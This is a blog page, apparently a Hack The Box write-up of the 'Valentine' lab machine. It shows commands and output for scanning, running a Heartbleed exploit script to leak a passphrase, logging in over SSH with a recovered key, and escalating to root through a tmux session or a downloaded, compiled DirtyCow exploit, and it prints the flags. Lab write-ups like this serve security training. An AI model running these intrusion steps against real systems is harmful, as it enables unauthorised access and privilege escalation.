@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          Hack The Box - Valentine - DiegoExploit
+        
+    </title>
+    <style>
+  #carbonads {
+    border: 1px solid black;
+    border-radius: 7px;
+    border-spacing: 7px;
+    display: block;
+    overflow: hidden;
+    padding: 1em;
+    line-height: 1.5;
+  }
+  #carbonads span {
+    position: relative;
+    display: block;
+    overflow: hidden;
+  }
+  .carbon-img {
+    float: left;
+    margin-right: 1em;
+  }
+  .carbon-img img {
+    display: block;
+  }
+  .carbon-text {
+    display: block;
+    float: left;
+    max-width: calc(100% - 130px - 1em);
+    text-align: left;
+  }
+  .carbon-poweredby {
+    position: absolute;
+    left: 142px;
+    bottom: 0;
+    display: block;
+    font-size: .8em;
+    line-height: 1;
+    letter-spacing: 1px;
+    }
+    </style>
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-P385GSF');</script>
+<!-- End Google Tag Manager -->
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-P385GSF"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+    <style>
+      #htbbadge{
+        float: left;
+      }
+    </style>
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="DiegoExploit" type="application/rss+xml">
+</head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>DiegoExploit</span>
+  </a>
+</div>
+    <div class="book-menu">
+  <ul>
+<li><a href="/">Home</a></li>
+</ul>
+<h1 id="Categories Windows"><a href="#Categories Windows" class="headerlink" title="Categories Windows"></a>Categories Windows</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+<li><a href="/hack-the-box/legacy/">1. Hack The Box - Legacy</a></li>
+<li><a href="/hack-the-box/devel/">2. Hack The Box - Devel</a></li>
+<li><a href="/hack-the-box/optimum/">3. Hack The Box - Optimum</a></li>
+<li><a href="/hack-the-box/bastard/">4. Hack The Box - Bastard</a></li>
+<li><a href="/hack-the-box/artic/">5. Hack The Box - Artic</a></li>
+<li><a href="/hack-the-box/grandpa/">6. Hack The Box - Grandpa</a></li>
+<li><a href="/hack-the-box/granny/">7. Hack The Box - Granny</a></li>
+<li><a href="/hack-the-box/blue/">8. Hack The Box - Blue</a></li>
+<li><a href="/hack-the-box/silo/">9. Hack The Box - Silo</a></li>
+<li><a href="/hack-the-box/bounty/">10. Hack The Box - Bounty</a></li>
+<li><a href="/hack-the-box/jerry/">11. Hack The Box - Jerry</a></li>
+<li><a href="/hack-the-box/conceal/">12. Hack The Box - Conceal</a></li>
+<li><a href="/hack-the-box/chatterbox/">13. Hack The Box - Chatterbox</a></li>
+<li><a href="/hack-the-box/forest/">14. Hack The Box - Forest</a></li>
+<li><a href="/hack-the-box/bankrobber/">15. Hack The Box - BkRobber</a></li>
+<li><a href="/hack-the-box/secnotes/">16. Hack The Box - Secnotes</a></li>
+<li><a href="/hack-the-box/bastion/">17. Hack The Box - Bastion</a></li>
+
+</ul>
+<h1 id="Categories Linux"><a href="#Categories Linux" class="headerlink" title="Categories Linux"></a>Categories Linux</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+<li><a href="/hack-the-box/lame/">1. Hack The Box - Lame</a></li>
+<li><a href="/hack-the-box/popcorn/">2. Hack The Box - Popcorn</a></li>
+<li><a href="/hack-the-box/beep/">3. Hack The Box - Beep</a></li>
+<li><a href="/hack-the-box/tenten/">4. Hack The Box - Tenten</a></li>
+<li><a href="/hack-the-box/cronos/">5. Hack The Box - Cronos</a></li>
+<li><a href="/hack-the-box/brainfuck/">6. Hack The Box - brainfuck</a></li>
+<li><a href="/hack-the-box/shocker/">6. Hack The Box - Shocker</a></li>
+<li><a href="/hack-the-box/bashed/">7. Hack The Box - Bashed</a></li>
+<li><a href="/hack-the-box/nibbles/">8. Hack The Box - Nibbles</a></li>
+<li><a href="/hack-the-box/nineveh/">9. Hack The Box - Nineveh</a></li>
+<li><a href="/hack-the-box/sense/">10. Hack The Box - Sense</a></li>
+<li><a href="/hack-the-box/solidstate/">11. Hack The Box - SolidState</a></li>
+<li><a href="/hack-the-box/kotarak/">12. Hack The Box - Kotarak</a></li>
+<li><a href="/hack-the-box/node/">13. Hack The Box - Node</a></li>
+<li><a href="/hack-the-box/valentine/">14. Hack The Box - Valentine</a></li>
+<li><a href="/hack-the-box/poison/">15. Hack The Box - Poison</a></li>
+<li><a href="/hack-the-box/sunday/">16. Hack The Box - Sunday</a></li>
+<li><a href="/hack-the-box/tartasauce/">17. Hack The Box - Tartasauce</a></li>
+<li><a href="/hack-the-box/friendzone/">18. Hack The Box - Friendzone</a></li>
+<li><a href="/hack-the-box/swagshop/">19. HTB- SwagShop</a></li>
+<li><a href="/hack-the-box/jarvis/">20. Hack The Box Jarvis</a></li>
+</ul>
+
+
+
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <br>
+  <h1 id="Hack-The-Box-Valentine"><a href="#Hack-The-Box-Valentine" class="headerlink" title="Hack The Box - Valentine"></a>Hack The Box - Valentine</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Valentine is a very unique medium difficulty machine which focuses on the Heartbleed vulnerability, which had devastating impact on systems across the globe. Its IP address is <code>10.10.10.79</code> Let’s go to hack!!!<br><img src="/images/hackthebox/exploit/valentine/0.png" alt=""></p>
+<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2>
+<p>As always we will start with <code>nmap</code> to scan for open ports and services:
+
+<pre><figure class="highlight plain">  |-------(root@kali)-------|(~/HackTheBox/valentine)
+ |
+ |-->{SFire129}#nmap -p- -T 5 10.10.10.79
+ Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-18 10:29 EDT
+ Warning: 10.10.10.79 giving up on port because retransmission cap hit (2).
+ Nmap scan report for 10.10.10.79
+ Host is up (0.11s latency).
+ Not shown: 65532 closed ports
+ PORT    STATE SERVICE
+ 22/tcp  open  ssh
+ 80/tcp  open  http
+ 443/tcp open  https
+ # Nmap done at Thu Jun 18 11:08:25 2020 -- 1 IP address (1 host up) scanned in 67.46 seconds</figure></pre>
+ <p>Scan vulnerabilities on 22,80 and 443 ports with nmap.
+ 
+ <pre><figure class="highlight plain"> 
+ |-------(root@kali)-------|(~/HackTheBox/valentine)
+ |
+ |-->{SFire129}#cat nmap_vuln.nmap
+ # Nmap 7.80 scan initiated Thu Jun 18 11:07:18 2020 as: nmap -p 22,80,443 --script vuln -oA nmap_vuln 10.10.10.79
+ Pre-scan script results:
+ | broadcast-avahi-dos:
+ |   Discovered hosts:
+ |     224.0.0.251
+ |   After NULL UDP avahi packet DoS (CVE-2011-1002).
+ |_  Hosts are all up (not vulnerable).
+ Nmap scan report for 10.10.10.79
+ Host is up (0.11s latency).
+ 
+ PORT    STATE SERVICE
+ 22/tcp  open  ssh
+ |_clamav-exec: ERROR: Script execution failed (use -d to debug)
+ 80/tcp  open  http
+ |_clamav-exec: ERROR: Script execution failed (use -d to debug)
+ |_http-csrf: Couldn't find any CSRF vulnerabilities.
+ |_http-dombased-xss: Couldn't find any DOM based XSS.
+ | http-enum:
+ |   /dev/: Potentially interesting directory w/ listing on 'apache/2.2.22 (ubuntu)'
+ |_  /index/: Potentially interesting folder
+ |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+ |_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
+ 443/tcp open  https
+ |_clamav-exec: ERROR: Script execution failed (use -d to debug)
+ |_http-csrf: Couldn't find any CSRF vulnerabilities.
+ |_http-dombased-xss: Couldn't find any DOM based XSS.
+ | http-enum:
+ |   /dev/: Potentially interesting directory w/ listing on 'apache/2.2.22 (ubuntu)'
+ |_  /index/: Potentially interesting folder
+ |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+ |_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
+ | ssl-ccs-injection:
+ |   VULNERABLE:
+ |   SSL/TLS MITM vulnerability (CCS Injection)
+ |     State: VULNERABLE
+ |     Risk factor: High
+ |       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
+ |       does not properly restrict processing of ChangeCipherSpec messages,
+ |       which allows man-in-the-middle attackers to trigger use of a zero
+ |       length master key in certain OpenSSL-to-OpenSSL communications, and
+ |       consequently hijack sessions or obtain sensitive information, via
+ |       a crafted TLS handshake, aka the "CCS Injection" vulnerability.
+ |
+ |     References:
+ |       http://www.openssl.org/news/secadv_20140605.txt
+ |       http://www.cvedetails.com/cve/2014-0224
+ |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
+ | ssl-heartbleed:
+ |   VULNERABLE:
+ |   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
+ |     State: VULNERABLE
+ |     Risk factor: High
+ |       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
+ |
+ |     References:
+ |       http://www.openssl.org/news/secadv_20140407.txt
+ |       http://cvedetails.com/cve/2014-0160/
+ |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
+ | ssl-poodle:
+ |   VULNERABLE:
+ |   SSL POODLE information leak
+ |     State: VULNERABLE
+ |     IDs:  BID:70574  CVE:CVE-2014-3566
+ |           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
+ |           products, uses nondeterministic CBC padding, which makes it easier
+ |           for man-in-the-middle attackers to obtain cleartext data via a
+ |           padding-oracle attack, aka the "POODLE" issue.
+ |     Disclosure date: 2014-10-14
+ |     Check results:
+ |       TLS_RSA_WITH_AES_128_CBC_SHA
+ |     References:
+ |       https://www.openssl.org/~bodo/ssl-poodle.pdf
+ |       https://www.securityfocus.com/bid/70574
+ |       https://www.imperialviolet.org/2014/10/14/poodle.html
+ |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
+ |_sslv2-drown:
+ 
+ # Nmap done at Thu Jun 18 11:08:25 2020 -- 1 IP address (1 host up) scanned in 67.46 seconds</figure></pre>
+ <p>The output show some directories over port 80/443.
+  <img src="/images/hackthebox/exploit/valentine/1.png" alt=""></p>
+  <p>Directoy /dev.
+  <img src="/images/hackthebox/exploit/valentine/2.png" alt=""></p>
+  <h2 id="Enumerate"><a href="#Enumerate" class="Enumerate" title="Enumerate"></a>Enumerate</h2>
+ <p>The file hype_key reveal information.
+  <img src="/images/hackthebox/exploit/valentine/3.png" alt=""></p>
+  <p>Copy the output and search some converter from hex to ascii.
+  <img src="/images/hackthebox/exploit/valentine/4.png" alt=""></p>
+  <p>Copy the output and create a file with name hype.key and paste the code ascii.
+  <img src="/images/hackthebox/exploit/valentine/5.png" alt=""></p>
+  <p>The output in nmap shown Heartbleed vulnerability. Search <a class="vglnk"https://gist.github.com/eelsivart/10174134"rel="nofollow"><span>heartbleed script</span></a> in github and run against the target. 
+   <pre><figure class="highlight plain"> |-------(root@kali)-------|(/opt/heartbleed)                           
+ |
+ |-->{SFire129}#python heartbleed.py -x 10.10.10.79                                                                                                                                                                                                                                                                                                      defribulator v1.16
+ A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)                                                                                   
+ ##################################################################
+ Connecting to: 10.10.10.79:443, 1 times
+ Sending Client Hello for TLSv1.0
+ Received Server Hello for TLSv1.0
+ 
+ WARNING: 10.10.10.79:443 returned more data than it should - server is vulnerable!
+ Please wait... connection attempt 1 of 1
+ ##################################################################
+ 
+   0000: 02 40 00 D8 03 01 53 43 5B 90 9D 9B 72 0B BC 0C  .@....SC[...r...
+   0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .+..H...9.......
+   0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....".
+   0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.
+   0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0  ................
+   0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00  ............3.2.
+   0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00  ....E.D...../...
+   0070: 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00  A...............
+   0080: 12 00 09 00 14 00 11 00 08 00 06 00 03 00 FF 01  ................
+   0090: 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00  ..I...........4.
+   00a0: 32 00 0E 00 0D 00 19 00 0B 00 0C 00 18 00 09 00  2...............
+   00b0: 0A 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00  ................
+   00c0: 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0F 00  ................
+   00d0: 10 00 11 00 23 00 00 00 0F 00 01 01 30 2E 30 2E  ....#.......0.0.
+   00e0: 31 2F 64 65 63 6F 64 65 2E 70 68 70 0D 0A 43 6F  1/decode.php..Co
+   00f0: 6E 74 65 6E 74 2D 54 79 70 65 3A 20 61 70 70 6C  ntent-Type: appl
+   0100: 69 63 61 74 69 6F 6E 2F 78 2D 77 77 77 2D 66 6F  ication/x-www-fo
+   0110: 72 6D 2D 75 72 6C 65 6E 63 6F 64 65 64 0D 0A 43  rm-urlencoded..C
+   0120: 6F 6E 74 65 6E 74 2D 4C 65 6E 67 74 68 3A 20 34  ontent-Length: 4
+   0130: 32 0D 0A 0D 0A 24 74 65 78 74 3D 61 47 56 68 63  2....$text=aGVhc
+   0140: 6E 52 69 62 47 56 6C 5A 47 4A 6C 62 47 6C 6C 64  nRibGVlZGJlbGlld
+   0150: 6D 56 30 61 47 56 6F 65 58 42 6C 43 67 3D 3D B4  mV0aGVoeXBlCg==.
+   0160: 61 1B F4 2B F5 E5 7C D0 00 FA AD 98 64 C4 53 9A  a..+..|.....d.S.
+   0170: 67 2E F0 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C  g...............
+   0180: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ </figure></pre>
+ <p>The output reveal information about characters that looks like base64 <code>aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==</code>.
+  <pre><figure class="highlight plain"> |-------(root@kali)-------|(/opt/heartbleed)
+ |
+ |-->{SFire129}#echo -n aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg== | base64 -d
+ heartbleedbelievethehype</figure></pre>
+ <h2 id="Exploit"><a href="#Exploit" class="Exploit" title="Exploit"></a>Exploit</h2>
+<p>With <code>chmod 600</code> add privileges to hype.key file. Try to connect by ssh.
+  <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/valentine)
+ |
+ |-->{SFire129}#ssh -i hype.key hype@10.10.10.79
+ Enter passphrase for key 'hype.key':
+ Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)
+ 
+  * Documentation:  https://help.ubuntu.com/
+ 
+ New release '14.04.5 LTS' available.
+ Run 'do-release-upgrade' to upgrade to it.
+ 
+ Last login: Thu Jun 18 10:58:43 2020 from 10.10.14.29
+ hype@Valentine:~$
+ hype@Valentine:~$ </figure></pre>
+<p>Enumerate with the LinEnum.sh no reveal information, then search in the bash history.
+<img src="/images/hackthebox/exploit/valentine/6.png" alt=""></p>  
+ <h2 id="Get-Privileges"><a href="#Get-Privileges" class="Get-Privileges" title="Get-Privileges"></a>Get Privilges</h2>
+<p>The bash history show a tmux command, search in the process list filterd with root.
+ <pre><figure class="highlight plain">ps -ef |grep root</figure></pre>
+ <img src="/images/hackthebox/exploit/valentine/7.png" alt=""></p>  
+ <p>run tmux -S /.devs/dev_sess to get privileges
+<pre><figure class="highlight plain"> uid=0(firefart) gid=0(root) groups=0(root)</figure></pre>
+ <p>Another way is with dirtycow ninja, download the script .c compile and change the password.<br>
+ <p>1.) Download from github dirtycow https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c.<br>
+ <p>2.) In ssh service target, create a file dirty.c with the content downloaded.<br>
+ <p>3.) Run gcc -pthread dirty.c -o durty -lcrypt.<br>
+ <p>4.) Run ./dirty and put a password.<br>
+ <p>5.) The program created a user firefart, with the command su - and password created get privileges.
+<pre><figure class="highlight plain"> hype@Valentine:~$ su -
+ Password:
+ firefart@Valentine:~# id
+ uid=0(firefart) gid=0(root) groups=0(root)
+ firefart@Valentine:~#</figure></pre>
+ 
+ <h2 id="Capture-The-Flag"><a href="#Capture-The-Flag" class="Capture-The-Flag" title="Capture-The-Flag"></a>Capture The Flag</h2>
+<pre><figure class="highlight plain">firefart@Valentine:~# cat /home/hype/Desktop/user.txt
+e6710a5464769fd5fcd216e076961750
+firefart@Valentine:~# cat root.txt
+f1bb6d759df1f272914ebbc9ed7765b2
+firefart@Valentine:~#</figure></pre>
+<p> And we owned root !</p>
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure class="avatar avatar-lg">
+          <img src="/avatar.png" alt="...">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>DiegoExploit</div>
+      <div>2020-06-18</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>
+
+      <a class="tag-link" href="/tags/linux/" rel="tag">#Linux</a> <a class="tag-link" href="/tags/sqli/" rel="tag">#DirtyCow</a> <a class="tag-link" href="/tags/ssh/" rel="tag">#Heartbleed</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
